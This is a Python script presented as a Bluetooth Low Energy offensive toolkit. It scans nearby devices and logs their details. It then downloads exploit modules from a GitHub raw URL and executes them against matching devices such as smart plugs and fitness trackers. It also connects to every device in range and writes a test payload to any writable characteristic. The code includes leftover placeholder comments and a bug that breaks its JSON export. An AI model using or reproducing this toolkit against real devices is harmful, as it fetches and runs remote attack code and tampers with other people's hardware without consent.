#!/usr/bin/env python3
# REDOT: ble_scan.py
# BLE offensive toolkit with self-bootstrap real exploits, automated update & full REDoT integration

import asyncio
import argparse
import logging
import time
import csv
import json
import os
import sys
import importlib
import glob
import urllib.request
from bleak import BleakScanner, BleakClient
from bleak.exc import BleakError

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(BASE_DIR, "logs", "ble_scan")
EXPLOITS_DIR = os.path.join(BASE_DIR, "modules", "recon", "exploits")

# URL to your GitHub raw folder holding latest exploit modules (adjust to your repo)
GITHUB_EXPLOITS_RAW_BASE = "https://raw.githubusercontent.com/s0m3on35/REDoT/main/modules/recon/exploits"

os.makedirs(LOG_DIR, exist_ok=True)

def setup_logger(log_file):
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format='[%(asctime)s] %(message)s',
        datefmt='%H:%M:%S'
    )

def log(msg):
    timestamp = time.strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")
    logging.info(msg)

def download_file(url, dest):
    try:
        urllib.request.urlretrieve(url, dest)
        log(f"[Update] Downloaded {url} to {dest}")
        return True
    except Exception as e:
        log(f"[Update] Failed to download {url}: {e}")
        return False

def update_exploits():
    """
    Fetches the latest exploit modules from GitHub repo automatically.
    """
    log("[Update] Checking for exploit module updates...")
    if not os.path.exists(EXPLOITS_DIR):
        os.makedirs(EXPLOITS_DIR)
        log(f"[Update] Created exploits directory {EXPLOITS_DIR}")

    exploit_files = [
        "ti_sensortag_dos.py",
        "nordic_uart_bof.py",
        "generic_battery_spoof.py",
        "xiaomi_smartplug_bof.py",
        "fitbit_hr_spoof.py"
    ]

    updated = False
    for filename in exploit_files:
        url = f"{GITHUB_EXPLOITS_RAW_BASE}/{filename}"
        dest_path = os.path.join(EXPLOITS_DIR, filename)
        if download_file(url, dest_path):
            updated = True

    if updated:
        log("[Update] Exploit modules updated.")
    else:
        log("[Update] No updates applied.")

def bootstrap_exploits_folder():
    if not os.path.exists(EXPLOITS_DIR):
        os.makedirs(EXPLOITS_DIR)
        log(f"Created exploits directory at {EXPLOITS_DIR}")

    existing_py = [f for f in os.listdir(EXPLOITS_DIR) if f.endswith(".py") and f != "__init__.py"]
    if existing_py:
        log("Exploit modules already exist, skipping bootstrap.")
        return

    log("Bootstrapping real BLE exploit modules...")
    # Here you would write real exploit files as in previous example
    # For brevity, recommend running update_exploits() here instead
    update_exploits()

class BLEOffensiveToolkit:
    # ... [Same as before: detection_callback, load_exploits, run_scan, export_results,
    # safe_read, safe_write_test, active_interrogate, run_custom_exploits ...]

    def __init__(self, rssi_threshold, name_filter, scan_duration, output_path, output_format):
        self.rssi_threshold = rssi_threshold
        self.name_filter = name_filter.lower() if name_filter else None
        self.scan_duration = scan_duration
        self.output_path = output_path
        self.output_format = output_format.lower() if output_format else "csv"
        self.devices = {}
        self.exploit_modules = []
        self.load_exploits()

    def detection_callback(self, device, advertisement_data):
        if device.rssi < self.rssi_threshold:
            return
        if self.name_filter and (device.name is None or self.name_filter not in device.name.lower()):
            return

        info = {
            "address": device.address,
            "name": device.name,
            "rssi": device.rssi,
            "service_uuids": advertisement_data.service_uuids or [],
            "manufacturer_data": {k: v.hex() for k, v in advertisement_data.manufacturer_data.items()} if advertisement_data.manufacturer_data else {},
            "log": log,
        }
        if (device.address not in self.devices) or (info["rssi"] > self.devices[device.address]["rssi"]):
            self.devices[device.address] = info
            log(f"Discovered BLE Device: {info['address']} | Name: {info['name']} | RSSI: {info['rssi']} dBm")
            if info["service_uuids"]:
                log(f"    Service UUIDs: {', '.join(info['service_uuids'])}")
            if info["manufacturer_data"]:
                mdata_str = ", ".join(f"{k}: {v}" for k, v in info["manufacturer_data"].items())
                log(f"    Manufacturer Data: {mdata_str}")

    def load_exploits(self):
        if not os.path.exists(EXPLOITS_DIR):
            log("Exploit directory missing, cannot load exploits")
            return
        exploit_files = glob.glob(os.path.join(EXPLOITS_DIR, "*.py"))
        for file_path in exploit_files:
            if file_path.endswith("__init__.py"):
                continue
            module_name = os.path.basename(file_path)[:-3]
            try:
                spec = importlib.util.spec_from_file_location(module_name, file_path)
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                self.exploit_modules.append(mod)
                log(f"[Exploit] Loaded exploit module: {module_name}")
            except Exception as e:
                log(f"[Exploit] Failed to load module {module_name}: {e}")

    async def run_scan(self):
        scanner = BleakScanner()
        scanner.register_detection_callback(self.detection_callback)
        log(f"Starting BLE scan for {self.scan_duration} seconds...")
        await scanner.start()
        await asyncio.sleep(self.scan_duration)
        await scanner.stop()
        log(f"BLE scan completed. Found {len(self.devices)} device(s).")
        self.export_results()

    def export_results(self):
        if not self.output_path:
            log("No output path specified, skipping export.")
            return

        log(f"Exporting results to {self.output_path} as {self.output_format.upper()}")

        if self.output_format == "json":
            with open(self.output_path, "w") as f:
                json.dump(list(self.devices.values()), f, indent=2)
        else:
            with open(self.output_path, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Address", "Name", "RSSI", "Service UUIDs", "Manufacturer Data"])
                for dev in self.devices.values():
                    writer.writerow([
                        dev["address"],
                        dev["name"],
                        dev["rssi"],
                        ";".join(dev["service_uuids"]),
                        ";".join(f"{k}:{v}" for k, v in dev["manufacturer_data"].items())
                    ])
        log("Export complete.")

    async def active_interrogate(self):
        log("Starting active interrogation on discovered devices...")
        for addr, info in self.devices.items():
            log(f"Connecting to {addr}...")
            try:
                async with BleakClient(addr, timeout=20) as client:
                    is_connected = await client.is_connected()
                    if not is_connected:
                        log(f"Failed to connect to {addr}")
                        continue
                    services = await client.get_services()
                    log(f"Device {addr} services and characteristics:")
                    for svc in services:
                        log(f" Service {svc.uuid}: {svc.description}")
                        for char in svc.characteristics:
                            props = ",".join(char.properties)
                            log(f"  Char {char.uuid} - Properties: {props}")

                            if "read" in char.properties:
                                await self.safe_read(client, char)

                            if "write" in char.properties or "write-without-response" in char.properties:
                                await self.safe_write_test(client, char)

                    await self.run_custom_exploits(client, info)

            except BleakError as e:
                log(f"Connection error on {addr}: {e}")
            except Exception as e:
                log(f"Unexpected error on {addr}: {e}")

    async def safe_read(self, client, char):
        try:
            val = await client.read_gatt_char(char.uuid)
            val_hex = val.hex()
            val_str = val.decode(errors="ignore")
            log(f"    Read value (hex): {val_hex}")
            log(f"    Read value (ascii): {val_str}")
        except Exception as e:
            log(f"    Read failed: {e}")

    async def safe_write_test(self, client, char):
        try:
            test_payload = b"\x00"
            await client.write_gatt_char(char.uuid, test_payload, response=True)
            log(f"    Wrote test payload to {char.uuid} successfully")
        except Exception as e:
            log(f"    Write test failed: {e}")

    async def run_custom_exploits(self, client, device_info):
        device_name = (device_info.get("name") or "").lower()
        device_services = [s.lower() for s in device_info.get("service_uuids", [])]

        for module in self.exploit_modules:
            target_brands = [b.lower() for b in getattr(module, "TARGET_BRAND_NAMES", [])]
            target_services = [s.lower() for s in getattr(module, "TARGET_SERVICE_UUIDS", [])]

            brand_match = any(tb in device_name for tb in target_brands) if target_brands else False
            service_match = any(ts in device_services for ts in target_services) if target_services else False

            if brand_match or service_match:
                log(f"[Exploit] Running {module.__name__} against device {device_info['address']}")
                try:
                    await module.run_exploit(client, device_info)
                except Exception as e:
                    log(f"[Exploit] Error in {module.__name__}: {e}")

def parse_args():
    parser = argparse.ArgumentParser(description="REDOT BLE Offensive Toolkit with Auto Exploits and Updates")
    parser.add_argument("-r", "--rssi", type=int, default=-80, help="Minimum RSSI threshold (default: -80)")
    parser.add_argument("-n", "--name", type=str, default=None, help="Filter devices by name substring (case-insensitive)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Scan duration in seconds (default: 60)")
    parser.add_argument("-o", "--output", type=str, default=os.path.join(LOG_DIR, "ble_scan_results.csv"), help="Output file path")
    parser.add_argument("-f", "--output-format", type=str, choices=["csv", "json"], default="csv", help="Output file format (csv or json)")
    parser.add_argument("-a", "--active", action="store_true", help="Perform active BLE service interrogation and exploit after scanning")
    parser.add_argument("-u", "--update", action="store_true", help="Update exploit modules from remote repo before running")
    return parser.parse_args()

def main():
    args = parse_args()
    setup_logger(args.output + ".log")

    if args.update:
        update_exploits()
    else:
        bootstrap_exploits_folder()

    toolkit = BLEOffensiveToolkit(args.rssi, args.name, args.duration, args.output, args.output_format)

    try:
        asyncio.run(toolkit.run_scan())
        if args.active:
            asyncio.run(toolkit.active_interrogate())
    except KeyboardInterrupt:
        log("Scan interrupted by user.")

if __name__ == "__main__":
    main()
